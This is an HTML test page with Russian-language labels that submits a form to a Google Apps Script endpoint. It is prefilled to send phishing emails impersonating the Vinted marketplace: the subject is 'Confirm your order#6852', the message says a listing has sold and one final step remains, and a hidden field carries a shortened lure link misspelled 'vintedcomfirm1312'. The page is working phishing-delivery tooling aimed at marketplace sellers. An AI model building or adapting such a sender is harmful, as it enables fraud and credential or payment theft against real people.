<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Тест Formspree</title>
  <style>
    body { font-family: sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; }
    label { display: block; margin-top: 12px; font-weight: 600; }
    input, textarea { width: 100%; padding: 8px; margin-top: 4px; box-sizing: border-box; }
    button { margin-top: 16px; padding: 10px 20px; cursor: pointer; }
    #result { margin-top: 20px; padding: 12px; border-radius: 6px; display: none; }
    #result.ok { background: #d4edda; color: #155724; display: block; }
    #result.err { background: #f8d7da; color: #721c24; display: block; }
  </style>
</head>
<body>
  <h1>Тестовая форма</h1>

  <form id="testForm" action="https://script.google.com/macros/s/AKfycbzqkVfTsbf0nAU1CzrYs0KlE0LWMJ3pddNdLrzKH78RrGC2akZRapQHax8DaOYKrPJT-w/exec" method="POST">
    <label>
      Ваше имя:
      <input type="text" name=" " required>
    </label>

    <label>
      Тема письма:
      <input type="text" name="_subject" value="Confirm your order#6852">
    </label>

    <label>
      Сообщение:
      <textarea name="message" rows="4" required>Great news — your listing has been successfully purchased on vinted 🎊. We're almost there, but there's just one final step to complete the process and unlock all the benefits of your sale.</textarea>
    </label>

    <!-- 👇 Ссылка, которая попадёт в письмо получателю -->
    <input type="hidden" name="View details" value="https://sl4.me/vintedcomfirm1312">

    <button type="submit">Отправить тест</button>
  </form>

  <div id="result"></div>

  <script>
    const form = document.getElementById('testForm');
    const result = document.getElementById('result');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      result.className = '';
      result.textContent = 'Отправка...';
      result.style.display = 'block';

      try {
        const res = await fetch(form.action, {
          method: 'POST',
          body: new FormData(form),
          headers: { 'Accept': 'application/json' }
        });

        if (res.ok) {
          result.className = 'ok';
          result.textContent = '✅ Успешно отправлено! Проверьте почту.';
          form.reset();
        } else {
          const data = await res.json().catch(() => ({}));
          result.className = 'err';
          result.textContent = '❌ Ошибка: ' + JSON.stringify(data.errors || data);
        }
      } catch (err) {
        result.className = 'err';
        result.textContent = '❌ Сетевая ошибка: ' + err.message;
      }
    });
  </script>
</body>
</html>
